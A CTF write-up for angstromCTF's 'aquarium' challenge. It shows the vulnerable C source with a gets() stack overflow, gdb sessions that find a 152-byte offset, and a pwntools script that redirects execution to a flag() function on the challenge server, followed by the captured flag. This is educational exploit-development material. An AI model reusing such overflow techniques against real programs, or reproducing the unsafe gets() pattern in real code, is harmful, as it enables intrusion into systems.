## angstromCTF: aquarium
##### *tl;dr: buffer overflow to change control flow*
#### The pwn challenges for this ctf are 64-bit, which I've never worked with and understood before, thus lead me to learning some new stuff to be used in the upcoming ctfs. It's important to note that we are given the source codes for the binaries, which makes it somewhat easier to understand the control flow and spot the vulnerability. 
##### aquarium.c
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

struct fish_tank {
	char name[50];
	int fish;
	int fish_size;
	int water;
	int width;
	int length;
	int height;
};


struct fish_tank create_aquarium() {
	struct fish_tank tank;

	printf("Enter the number of fish in your fish tank: ");
	scanf("%d", &tank.fish);
	getchar();

	printf("Enter the size of the fish in your fish tank: ");
	scanf("%d", &tank.fish_size);
	getchar();

	printf("Enter the amount of water in your fish tank: ");
	scanf("%d", &tank.water);
	getchar();

	printf("Enter the width of your fish tank: ");
	scanf("%d", &tank.width);
	getchar();

	printf("Enter the length of your fish tank: ");
	scanf("%d", &tank.length);
	getchar();

	printf("Enter the height of your fish tank: ");
	scanf("%d", &tank.height);
	getchar();

	printf("Enter the name of your fish tank: ");
	char name[50];
	gets(name);

	strcpy(name, tank.name);
	return tank;
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	struct fish_tank tank;

	tank = create_aquarium();

	if (tank.fish_size * tank.fish + tank.water > tank.width * tank.height * tank.length) {
		printf("Your fish tank has overflowed!\n");
		return 1;
	}

	printf("Nice fish tank you have there.\n");

	return 0;
}
```
#### Analyzing the source code, we see that we are given prompts for various variables for the struct. We also spot the vulnerable gets call on the last prompt, which we can use to perform a buffer overflow. Fire up gdb and do tests on the binary, we can input anything we want on the first few prompts, but we do want to perform the overflow on the prompt for the name.:
```
$ gdb ./aquarium
  gdb-peda$ pattern create 200
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
  
  gdb-peda$ r
  Enter the number of fish in your fish tank: 1000
  Enter the size of the fish in your fish tank: 1000
  Enter the amount of water in your fish tank: 1000
  Enter the width of your fish tank: 1000
  Enter the length of your fish tank: 1000
  Enter the height of your fish tank: 1000
  Enter the name of your fish tank: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
  
  [...]
  RIP: 0x40138e (<create_aquarium+469>:	ret)
  => 0x40138e <create_aquarium+469>:	ret  
  Stopped reason: SIGSEGV
  0x000000000040138e in create_aquarium ()
```
#### Trying to input 200 bytes of random characters, we can be able to trigger the segfault error, but it seems that we don't have control of our rip register. But I have learned that we do have control over it, we just need to find at which offset we can do it. We do this by simply checking the content of the `rsp` register to get the offset then we proceed to verify our control.
```
gdb-peda$ x/wx $rsp
0x7fffffffdd78:	0x41417041

gdb-peda$ pattern offset 0x41417041
1094807617 found at offset: 152

gdb-peda$ r
  [...]
  Enter the name of your fish tank: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
  Stopped reason: SIGSEGV
  0x0000424242424242 in ?? ()
```
#### And yea, there we have it we can control program flow with offset 152. But where do we want to jump to now? We've seen a flag function in the code, and that's where we want to jump to - thus we need it's address:
```
gdb-peda$ p flag
$1 = {<text variable, no debug info>} 0x4011a6 <flag>
```
#### Then what we need for our exploit is complete, we now proceed to create our exploit script and run it against the server to get our flag.
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
HOST = 'shell.actf.co'
PORT = 19305
p = remote(HOST,PORT)
# p = process('./aquarium')

#: Exploit code
offset = 'A' * 152
flag_addr = p64(0x4011a6)
exploit = offset + flag_addr

#: Send payload
for prompts in range(6):
	p.sendline('1000')

print(p.recvuntil('Enter the name of your fish tank: '))
p.sendline(exploit)
p.interactive()
```
#### We got our flag! 
`actf{overflowed_more_than_just_a_fish_tank}`
